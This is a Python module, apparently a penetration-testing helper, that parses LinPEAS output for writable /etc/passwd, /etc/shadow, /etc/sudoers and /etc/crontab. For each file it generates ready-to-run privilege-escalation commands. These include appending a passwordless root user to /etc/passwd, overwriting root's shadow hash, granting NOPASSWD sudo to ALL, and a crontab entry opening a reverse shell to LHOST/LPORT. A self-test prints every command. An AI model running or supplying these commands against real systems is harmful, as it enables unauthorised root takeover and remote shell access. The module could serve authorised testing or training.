"""Detect writable sensitive file findings from LinPEAS output."""

import re
from typing import List, Dict

# Sensitive files to watch for
_SENSITIVE_FILES = (
    "/etc/passwd",
    "/etc/shadow",
    "/etc/sudoers",
    "/etc/crontab",
)

# Patterns that indicate a file is writable in LinPEAS output
_WRITABLE_PATTERNS = [
    # "-rw-rw-rw- 1 root root ... /etc/passwd"
    re.compile(r"-[r-][w-][wx]-[r-][w-][wx]-[r-][w-][wx]-\s+.*?(\S+)\s*$"),
    # "[+] /etc/passwd is writable" or "Writable: /etc/passwd"
    re.compile(r"(?:writable[:\s]+|is\s+writable).*?(/etc/\w+)", re.IGNORECASE),
    # bare path at end of line (e.g. LinPEAS highlighted output)
    re.compile(r"(/etc/(?:passwd|shadow|sudoers|crontab))\b"),
]


def parse_writable_files(section_text: str) -> List[str]:
    """Scan LinPEAS output for lines mentioning writable sensitive files."""
    found = []
    seen = set()

    for raw_line in section_text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue

        # Quick pre-filter: line must reference one of our targets
        target = next((f for f in _SENSITIVE_FILES if f in line), None)
        if target is None:
            continue

        # Confirm the line signals writability
        lower = line.lower()
        is_writable = (
            line == target                # bare path: LinPEAS only lists writable files here
            or "writable" in lower
            or "rw-rw-rw" in line
            or "-rw-rw-" in line          # group-writable at minimum
            or re.search(r"-[r-][w-][wx]-[r-][w-][wx]-[r-][w-][wx]-", line)
        )

        if not is_writable:
            continue

        if target not in seen:
            seen.add(target)
            found.append(target)

    return found


def generate_passwd_commands() -> List[str]:
    """Generate commands to exploit a writable /etc/passwd."""
    return [
        # No-password root user — simplest approach
        "echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd",
        "su hacker",
        # Hash-protected root user (requires openssl on target)
        "openssl passwd -1 -salt xyz password123",
        "echo 'hacker:$1$xyz$<PASTE_HASH_HERE>:0:0:root:/root:/bin/bash' >> /etc/passwd",
        "su hacker",
    ]


def generate_shadow_commands() -> List[str]:
    """Generate commands to exploit a writable /etc/shadow."""
    return [
        # Read existing root hash for offline cracking
        "grep root /etc/shadow",
        # Backup before modifying
        "cp /etc/shadow /tmp/shadow.bak",
        # Generate a known SHA-512 hash for 'password123'
        (
            "python3 -c \""
            "import crypt; "
            "print(crypt.crypt('password123', crypt.mksalt(crypt.METHOD_SHA512)))"
            "\""
        ),
        # Replace root's hash field (second field) with the generated hash
        "# Copy the hash printed above, then run:",
        "sed -i 's/^root:[^:]*/root:<PASTE_HASH_HERE>/' /etc/shadow",
        "su root  # password: password123",
    ]


def generate_sudoers_commands() -> List[str]:
    """Generate commands to exploit a writable /etc/sudoers."""
    return [
        "echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
        "sudo /bin/bash",
    ]


# Map each sensitive file to its command generator
_COMMAND_MAP = {
    "/etc/passwd":  generate_passwd_commands,
    "/etc/shadow":  generate_shadow_commands,
    "/etc/sudoers": generate_sudoers_commands,
    "/etc/crontab": lambda: [
        "echo '* * * * * root bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /etc/crontab",
    ],
}


def analyze(section_text: str) -> List[Dict]:
    """Parse LinPEAS output and return CRITICAL findings for writable sensitive files."""
    writable = parse_writable_files(section_text)

    findings: List[Dict] = []
    for filepath in writable:
        cmd_fn = _COMMAND_MAP.get(filepath)
        commands = cmd_fn() if cmd_fn else []
        findings.append({
            "file": filepath,
            "severity": "CRITICAL",
            "type": "writable_file",
            "commands": commands,
        })

    return findings


# ── Self-test ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    SAMPLE = """
# Checking for writable /etc files...
-rw-rw-rw- 1 root root 1823 Jan 10 12:00 /etc/passwd
[+] /etc/shadow is writable
Writable: /etc/sudoers
/usr/bin/python3 is installed
-rw-r--r-- 1 root root 421  Mar  5 09:00 /etc/crontab
# not writable above
-rw-rw-rw- 1 root root 421  Mar  5 09:00 /etc/crontab
"""

    print("=== parse_writable_files ===")
    files = parse_writable_files(SAMPLE)
    for f in files:
        print(f)

    print("\n=== generate_passwd_commands ===")
    for cmd in generate_passwd_commands():
        print(cmd)

    print("\n=== generate_shadow_commands ===")
    for cmd in generate_shadow_commands():
        print(cmd)

    print("\n=== generate_sudoers_commands ===")
    for cmd in generate_sudoers_commands():
        print(cmd)

    print("\n=== analyze ===")
    findings = analyze(SAMPLE)
    for f in findings:
        print(f"[{f['severity']}] {f['file']} ({f['type']})")
        for cmd in f["commands"]:
            print(f"  {cmd}")
